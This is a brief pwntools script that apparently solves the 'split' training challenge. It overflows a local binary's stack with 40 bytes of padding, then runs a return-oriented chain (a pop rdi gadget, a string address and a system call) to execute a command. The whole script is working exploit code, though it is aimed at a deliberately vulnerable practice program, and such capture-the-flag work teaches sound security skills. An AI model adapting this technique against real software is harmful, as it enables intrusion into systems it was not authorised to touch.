from pwn import *

r=process('./split')

r.recvuntil('> ')
flag=0x00601060
system=0x000000000040074b
poprdi=0x00000000004007c3
payload='a'*40
payload+=p64(poprdi)
payload+=p64(flag)
payload+=p64(system)

r.sendline(payload)
r.interactive()
